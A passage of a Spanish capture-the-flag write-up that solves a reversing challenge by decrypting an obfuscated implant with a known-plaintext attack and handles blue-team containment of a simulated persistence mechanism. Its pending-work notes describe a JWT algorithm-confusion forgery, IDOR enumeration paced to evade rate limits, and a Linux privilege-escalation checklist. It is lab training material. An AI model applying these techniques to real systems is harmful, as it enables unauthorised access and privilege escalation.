+### Paso 7 — Primer intento: reproducir el hash con el hostname real
+```python
+def fnv1a64(s: bytes, offset_basis: int, prime: int) -> int:
+    h = offset_basis
+    for b in s:
+        h ^= b
+        h = (h * prime) & 0xFFFFFFFFFFFFFFFF
+    return h
+
+hostname = b"srv-planificacion-01"
+OFFSET_BASIS = 0x14650fb0739d0383
+PRIME = 0x100000001b3
+h = fnv1a64(hostname, OFFSET_BASIS, PRIME)
+key = [(h >> (8*i)) & 0xff for i in range(8)]
+# ... desencriptar con esta key ...
+```
+**Resultado: no coincidió** con `NAVSYNC` (se probaron variantes:
+mayúsculas, con salto de línea, con dominio añadido — ninguna funcionó).
+Las constantes del algoritmo se verificaron por separado y eran
+correctas, así que el problema estaba en no poder reproducir el
+hostname exacto que usa `gethostname()` en el entorno original.
+
+### Paso 8 — Cambio de estrategia: ataque de texto plano conocido
+En vez de depender del hash del hostname, se aprovechó que el **magic
+"NAVSYNC\0" ya es texto plano conocido** (aparece sin cifrar en otra
+parte del binario, y es justo lo que debe salir al principio del
+descifrado). Para los primeros 8 bytes (`i = 0..7`), la rotación es
+siempre `0` (porque `i // 8 = 0`), así que la fórmula se simplifica a:
+```
+plano[i] = clave[i] XOR cifrado[i] - i
+```
+Despejando la clave (operación inversa):
+```python
+known = b"NAVSYNC\x00"    # los 8 bytes que DEBEN salir al principio
+key = [0]*8
+for i in range(7):        # solo conocemos con certeza "NAVSYNC" (7 letras)
+    val = (known[i] + i) & 0xff
+    key[i] = val ^ data[i]     # data = bytes cifrados del blob
+```
+Esto da directamente 7 de los 8 bytes de la clave, **sin necesitar el
+hash del hostname para nada**.
+
+### Paso 9 — Recuperar el octavo byte de la clave por fuerza bruta
+El byte 8 del texto plano (justo después de "NAVSYNC") no se conocía con
+certeza (se asumió `\x00` por el patrón visto en otra parte del binario,
+pero no se podía confirmar). Como solo hay 256 posibilidades, se probaron
+todas y se eligió la que maximiza el % de caracteres imprimibles en el
+texto completo:
+```python
+def decrypt_full(data, key):
+    out = bytearray(len(data))
+    for i, c in enumerate(data):
+        kb = key[i % 8]
+        rot = (i // 8) % 8
+        v = rotl8(kb, rot) ^ c
+        out[i] = (v - i) & 0xff
+    return bytes(out)
+
+best = None
+for k7 in range(256):
+    key2 = key[:7] + [k7]
+    out2 = decrypt_full(data, key2)
+    printable = sum(1 for b in out2 if 32 <= b < 127 or b in (9,10,13))
+    ratio = printable/len(out2)
+    if best is None or ratio > best[0]:
+        best = (ratio, k7, out2)
+
+ratio, k7, out2 = best
+print(f"Mejor key[7] = {hex(k7)} (ratio imprimibles: {ratio:.3f})")
+print(out2.decode('utf-8', errors='replace'))
+```
+Salió un `key[7]` con ratio de imprimibles = **1.000** (texto 100%
+limpio) — confirmación de que la clave era correcta.
+
+### Paso 10 — Leer el resultado descifrado
+```
+NAVSYNC
+[naval-syncd] mecanismo de persistencia instalado
+
+  unidad temporizador : /etc/systemd/system/naval-syncd.timer
+  unidad servicio     : /etc/systemd/system/naval-syncd.service
+  ExecStart           : /usr/lib/naval/naval-syncd --quiet --no-banner
+  OnBootSec           : 120
+  OnUnitActiveSec     : 900
+  WantedBy            : timers.target
+
+  nota: el nombre imita al servicio legitimo naval-sync.service, que si
+        pertenece al sistema de planificacion. Solo cambia una letra.
+
+  marcador: T4C{etc_systemd_system_naval_syncd_timer}
+```
+
+### Paso 11 — Normalizar la ruta según pedía el enunciado
+Regla: quitar la barra inicial, y cada `/`, `.`, `-` → `_`.
+```
+/etc/systemd/system/naval-syncd.timer
+→ etc_systemd_system_naval_syncd_timer
+→ T4C{etc_systemd_system_naval_syncd_timer}
+```
+(Coincide exactamente con el `marcador:` que el propio binario reveló al
+descifrarse — doble confirmación.)
+
+**✅ Flag:** `T4C{etc_systemd_system_naval_syncd_timer}`
+
+---
+
+<a name="pir-08"></a>
+## 6. PIR-08 — Contener el implante sin parar la planificación
+
+**Temática:** Respuesta a incidentes (Blue Team) — contención de una
+amenaza ya identificada, en un host interactivo propio por célula. A
+diferencia del resto de retos, aquí no hay nada que "romper": el objetivo
+es actuar con precisión sobre un sistema en vivo, sin causar daño
+colateral (el servicio legítimo) y entendiendo el mecanismo de
+persistencia antes de intervenir. Incluye además una **parte de decisión
+escrita** evaluada por rúbrica (razonamiento, no solo ejecución).
+
+**Acceso:** `cuarentena.locdynamics.com:9008`, host de cuarentena propio y
+recién creado para la célula.
+
+**Misión (técnica):** contener la amenaza sin detener el servicio
+legítimo, acreditándolo con `verificar-contencion`.
+**Misión (decisión):** justificar por escrito, en 150 palabras, si se opta
+por aislamiento total o contención parcial.
+
+### Enunciado original
+
+> **PIR-08. Contener el implante sin parar la planificación**
+> Con el servidor central bajo control, se confirma que el proceso del
+> implante sigue activo. En el mismo host corre el servicio legítimo de
+> sincronización de la planificación, del que depende el movimiento de la
+> unidad desplegada. Los dos procesos tienen nombres casi idénticos y
+> solo uno es el implante.
+> Misión (parte técnica): contener la amenaza y acreditar la contención
+> con el comando de verificación de la plataforma. Ese comando comprueba
+> tres condiciones, así que léelas antes de tocar nada.
+> Misión (parte de decisión): justificar por escrito, en 150 palabras
+> como máximo, si optas por aislar por completo el servidor o por
+> contener parcialmente sin desconectar el servicio.
+> Las dos partes se puntúan por separado. La justificación se evalúa con
+> una rúbrica, y aislar del todo puede obtener la nota máxima si el
+> razonamiento justifica la pérdida de servicio. Lo único que no puntúa
+> es no elegir.
+> Esta entrada puntúa solo la parte técnica. La justificación escrita se
+> entrega en la entrada «Justificación».
+> Formato de entrega: `T4C{...}`. La devuelve `verificar-contencion`
+> cuando se cumplen las tres condiciones. La justificación escrita va en
+> su propio formulario.
+
+### Paso 1 — Calcular la clave de turno
+El `<dato>` es el hostname del triaje del Reto 5 (`srv-planificacion-01`,
+ya lo teníamos de PIR-05):
+```bash
+printf '%s' 'K7Q2-M9XD:srv-planificacion-01' | sha256sum
+```
+Salida: `569439c9c68a92c2ac8646e10859239696244371fd5028c0524bb18e5f77f778`
+→ los **8 primeros caracteres**: `569439c9`
+
+### Paso 2 — Conectar al host de cuarentena
+```bash
+socat -,raw,echo=0 tcp:cuarentena.locdynamics.com:9008
+```
+(Usar `socat`, no `nc`, para que `Ctrl+C` llegue al host remoto en vez de
+cortar tu conexión y destruir el entorno — el enunciado lo advierte.)
+
+Al conectar, introduces la clave `569439c9` cuando se solicite.
+```
+Operacion Estrecho Fantasma - acceso restringido
+Clave de acceso: 569439c9
+Acceso concedido.
+root@1180bfb3ae4d:/#
+```
+
+### Paso 3 — Leer el comando de verificación ANTES de tocar nada
+El propio enunciado insiste en esto. Nunca actuar a ciegas:
+```bash
+verificar-contencion --help
+```
+Salida (resumen de las 3 condiciones que hay que cumplir):
+```
+[ KO ] el proceso del implante (naval-syncd) no esta en ejecucion
+[ KO ] la persistencia (naval-syncd.timer) esta desactivada o enmascarada
+[ ok ] el servicio legitimo naval-sync sigue operativo
+
+Pista de procedimiento: contener no es apagarlo todo, y matar
+un proceso que algo relanza no es contener.
+```
+
+### Paso 4 — Reconocer los procesos en ejecución
+```bash
+ps aux | grep -i naval
+```
+```
+root   7  /bin/sh /usr/lib/naval/naval-sync      <- LEGÍTIMO, no tocar
+root  10  /bin/sh /usr/lib/naval/naval-syncd     <- IMPLANTE (una "d" de más)
+```
+
+### Paso 5 — Comprobar si hay systemd real en este entorno
+```bash
+systemctl status naval-syncd.service
+```
+Salida: `bash: systemctl: command not found` — este contenedor **no**
+tiene systemd real (es habitual en contenedores ligeros tipo Docker, sin
+PID 1 = systemd). Hay que averiguar cómo se gestiona realmente la
+persistencia aquí:
+```bash
+cat /proc/1/comm          # -> init.sh (no es systemd)
+ps -ef --forest           # ver el árbol de procesos completo
+ls -la /etc/cron.d/ /etc/init.d/ 2>/dev/null
+crontab -l 2>/dev/null
+cat /etc/crontab 2>/dev/null
+```
+No hay cron ni systemd. El árbol de procesos muestra que PID 1 es
+`/usr/local/bin/init.sh`, y los procesos `naval-sync`/`naval-syncd`
+cuelgan directamente de él.
+
+### Paso 6 — Leer el script que hace de PID 1 (clave del reto)
+```bash
+cat /usr/local/bin/init.sh
+```
+Contenido relevante:
+```sh
+TIMER=/etc/systemd/system/naval-syncd.timer
+MASCARA=/etc/systemd/system/naval-syncd.timer.masked
+
+# Servicio legítimo: NO debe detenerse (proporcionalidad).
+/usr/lib/naval/naval-sync &
+
+# Supervisor del implante.
+while true; do
+    if [ -f "$TIMER" ] && [ ! -f "$MASCARA" ]; then
+        if ! pgrep -f '/usr/lib/naval/naval-syncd' >/dev/null 2>&1; then
+            /usr/lib/naval/naval-syncd &
+        fi
+    fi
+    sleep 20
+done
+```
+**Esto explica todo el mecanismo:** cada 20 segundos, el supervisor
+comprueba si existe el fichero `TIMER` y **no** existe el fichero
+`MASCARA`; si no está corriendo `naval-syncd`, lo relanza. Es decir: si
+solo matas el proceso, en menos de 20s vuelve a arrancar. La forma
+correcta de "desactivar la persistencia" en este entorno simulado es
+crear el fichero `.masked` (simula "enmascarar" una unidad systemd real).
+
+### Paso 7 — Ejecutar la contención en el orden correcto
+**El orden importa:** si matas el proceso antes de crear la máscara, el
+supervisor podría relanzarlo en el hueco de tiempo entre un comando y el
+otro. Por eso primero la máscara, luego matar:
+```bash
+touch /etc/systemd/system/naval-syncd.timer.masked
+pkill -f /usr/lib/naval/naval-syncd
+```
+
+### Paso 8 — Verificar
+```bash
+verificar-contencion
+```
+```
+[ ok ] el proceso del implante (naval-syncd) no esta en ejecucion
+[ ok ] la persistencia (naval-syncd.timer) esta desactivada o enmascarada
+[ ok ] el servicio legitimo naval-sync sigue operativo
+
+CONTENCION CONFIRMADA.
+
+flag tecnica: T4C{c0nt3nc10n_pr0c3s0_41sl4d0}
+```
+
+**✅ Flag técnica:** `T4C{c0nt3nc10n_pr0c3s0_41sl4d0}`
+
+### Justificación escrita (entrega aparte, "Justificación", máx. 150 palabras)
+Se optó por **contención parcial** (coherente con la acción técnica
+ejecutada), razonando que:
+- `naval-sync` y `naval-syncd` son procesos diferenciables (nombre y
+  binario), lo que permite neutralizar uno sin tocar el otro.
+- El servicio legítimo sostiene el movimiento de una unidad desplegada
+  en tiempo real — desconectarlo tendría coste operativo inmediato.
+- La amenaza estaba acotada y el mecanismo de persistencia, plenamente
+  comprendido (no había indicios de movimiento lateral ni exfiltración).
+- Un aislamiento total sería la opción correcta si hubiera esas señales
+  de incertidumbre — aquí no las había.
+
+(Se entrega en el formulario separado "Justificación", no en el mismo
+sitio que la flag técnica.)
+
+---
+
+<a name="resumen"></a>
+## 8. Tabla resumen de flags y temáticas
+
+| Reto | Temática | Flag / entrega | Estado |
+|---|---|---|---|
+| PIR-04 | Forense digital (correo + macro) | `T4C{m4cr0_st4g3r_b4s364_0culto}` | ✅ |
+| PIR-01 | Criptografía (RSA, primo compartido) | `T4C{f4ct0r_c0mun_ENV_4LG_77413}` | ✅ |
+| Reto06 (ORDOP) | Web + criptografía (integridad parcial, KOTH) | `T4C{gr4f0_h4sh_p4rc14l_ru74_d3sv14d4}` | ✅ |
+| Interceptación Aérea | Forense RF + material señuelo | `INTOXICACIÓN CONFIRMADA` | ✅ |
+| PIR-05 | Reversing (ELF ofuscado) | `T4C{etc_systemd_system_naval_syncd_timer}` | ✅ |
+| PIR-08 (técnica) | Respuesta a incidentes / contención | `T4C{c0nt3nc10n_pr0c3s0_41sl4d0}` | ✅ |
+| PIR-08 (decisión) | Respuesta a incidentes / justificación escrita | — (entrega en formulario "Justificación") | ✅ (redactada) |
+| PIR-02 | Web (IDOR + JWT) | — | ⏳ Pendiente |
+| PIR-07 | Post-explotación / escalada de privilegios | — | ⏳ Delegado |
+
+---
+
+<a name="pendientes"></a>
+## 7. Retos pendientes
+
+### PIR-02 — Puerta trasera del proveedor
+**Temática:** Explotación web — control de acceso roto vía IDOR y, en
+paralelo, una vulnerabilidad de JWT (confusión de algoritmo) que resultó
+ser una pista parcialmente falsa.
+
+**Acceso:** `https://puerto.locdynamics.com/reto02/` — login `cliente` /
+`cliente2026`.
+
+### Enunciado original
+
+> **PIR-02. ¿Por dónde se movió el adversario dentro del proveedor?**
+> El portal de seguimiento de envíos de Maritime Logistics Iberia lleva
+> semanas con comportamientos anómalos: consultas a referencias que no
+> pertenecen a quien las pide y accesos al área de gestión interna desde
+> cuentas de cliente.
+> Se ha replicado el portal en un entorno aislado para su explotación.
+> Entras con una cuenta de consulta ordinaria, `cliente` / `cliente2026`.
+> Misión: escalar desde esa cuenta hasta el panel de gestión interna y
+> extraer la clave de conciliación que figura en el registro de
+> incidencias.
+> Acceso: `https://puerto.locdynamics.com/reto02/`, sin tu usuario de la
+> plataforma. Es la única dirección del ejercicio que no lo pide, porque
+> el reto se resuelve con la cabecera `Authorization`, y el inicio de
+> sesión usaría esa misma cabecera. No hay nada que descargar.
+> Formato de entrega: `T4C{...}`. Es la clave de conciliación de la
+> incidencia INC-0104.
+
+**Lo que se confirmó:**
+- El portal expone su clave pública RSA en `/api/notificaciones/public-key`.
+- Se forjó con éxito un JWT `alg: HS256` firmado con HMAC usando esa clave
+  pública como secreto (ataque de confusión de algoritmo RS256→HS256), con
+  claims `{"usuario":"admin","rol":"admin"}`. El token se acepta en
+  `mis-envios`, pero **no cambia nada** — ese endpoint ignora el token por
+  completo.
+- Tras pedir una pista, se reveló el vector real: **IDOR en
+  `/reto02/tracking/<referencia>`** — el endpoint de detalle nunca
+  comprueba de quién es el envío, y las referencias son correlativas. La
+  cabecera del panel indica 14 envíos en la red; solo se conocían 3
+  (`MLI-2026-0212`, `0352`, `0810`).
+
+**Lo que falta:** enumerar las 14 referencias reales (no son un rango
+numérico simple 0001–0014 ni ±1 de las conocidas — se descartó por prueba
+directa) para encontrar un envío con nota de incidencia que contenga la
+clave de conciliación pedida en PIR-01, o acceder al panel de "Gestión
+Interna" mencionado en el aviso del sistema, cuyo endpoint real no se
+localizó (no aparece en el HTML, JS ni cabeceras; el fuzzing con gobuster
+se bloqueó por rate-limit del servidor — `429 Too Many Requests` — al usar
+varios hilos).
+
+**Recomendación para retomar:** enumerar `/tracking/` con un solo hilo y
+pausas (`sleep`) para no disparar el rate-limit, probando referencias
+dispersas en el rango 0200–0900, o pedir una segunda pista si el coste lo
+permite.
+
+### PIR-07 — Alcanzar el servidor central de planificación
+**Temática:** Post-explotación / escalada de privilegios en Linux, en un
+host compartido por todas las células (mismo filesystem).
+
+**Acceso:** `nc santabarbara.locdynamics.com 9007` (o mejor,
+`socat -,raw,echo=0 tcp:santabarbara.locdynamics.com:9007`).
+
+**Clave de turno:** `8 primeros caracteres del SHA-256 de
+"K7Q2-M9XD:<dato>"`, donde `<dato>` es el **identificador de la credencial
+filtrada del ingeniero**, tal como aparece en el **Reto 3** (OSINT) —
+resuelto por otro miembro del equipo, dato no disponible en esta sesión.
+
+**Misión:** escalar privilegios hasta control total del host y recuperar
+la clave que custodia el administrador.
+
+### Enunciado original
+
+> **PIR-07. Alcanzar el servidor central de planificación**
+> Desde el equipo comprometido se llega al servidor central. Se te
+> entrega una sesión de operador con privilegios limitados por conexión
+> TCP directa.
+> Hay un único servidor para todas las células y su sistema de ficheros
+> es común. Lo que dejes en `/tmp` lo puede ver cualquiera, y lo que
+> dejen otros también te puede afectar. Puedes encontrar herramientas
+> ajenas a medio hacer y, sin querer, dejar las tuyas al alcance de
+> otros.
+> Cada conexión corre en su propio proceso, de modo que si alguien rompe
+> su sesión la tuya sigue funcionando.
+> Misión: escalar privilegios hasta tener el control total del host y
+> recuperar la clave que custodia el administrador. Te recomendamos
+> trabajar en un subdirectorio propio.
+> A diferencia de los servicios web, esta consola no registra a qué
+> célula pertenece cada sesión, así que lo que alguien deje en `/tmp` no
+> lleva nombre.
+> Formato de entrega: `T4C{...}`. Es el contenido del fichero que
+> custodia el administrador.
+
+**Plan de ataque recomendado una vez dentro** (checklist estándar de
+escalada en Linux):
+```bash
+sudo -l                                   # privilegios sudo del usuario
+find / -perm -4000 -type f 2>/dev/null    # binarios SUID
+getcap -r / 2>/dev/null                   # capabilities con privilegios
+cat /etc/crontab; ls -la /etc/cron.d/     # tareas programadas
+ls -la /tmp /var/tmp                      # restos de otras células (el
+                                           # enunciado avisa de que el FS
+                                           # es compartido entre equipos)
+```
+**Aviso del enunciado:** trabajar en un subdirectorio propio dentro de
+`/tmp`, ya que el filesystem es común a todas las células y lo que otros
+dejen (o se hayan dejado involuntariamente) puede ayudar o estorbar.
+
+**Delegado a:** un compañero del equipo, que tiene el identificador del
+Reto 3.
+
+---
+
+<a name="metodologia"></a>
+## 9. Notas de metodología (para próximos retos)
+
+- **Forense de correo:** la cabecera `Authentication-Results` más fiable es
+  la generada por el **primer servidor propio** que recibe el correo, no
+  cualquier resultado "pass" que aparezca en saltos intermedios (puede ser
+  falsificado por el propio atacante).
+- **RSA con claves múltiples del mismo origen:** siempre probar `gcd` entre
+  módulos si hay más de una clave pública del mismo proveedor/dispositivo.
+- **Sellos/HMACs sobre JSON:** nunca asumir que cubren todos los campos —
+  comprobarlo vía esquema expuesto o probando a cambiar un campo.
+- **Binarios ofuscados con comprobación de entorno:** si hay un magic/string
+  de verificación en claro en el propio binario, un ataque de texto plano
+  conocido evita tener que reproducir exactamente la lógica de derivación
+  de claves.
+- **Persistencia simulada sin systemd real:** comprobar siempre qué es
+  realmente PID 1 (`cat /proc/1/comm`) antes de asumir que hay `systemctl`
+  disponible.
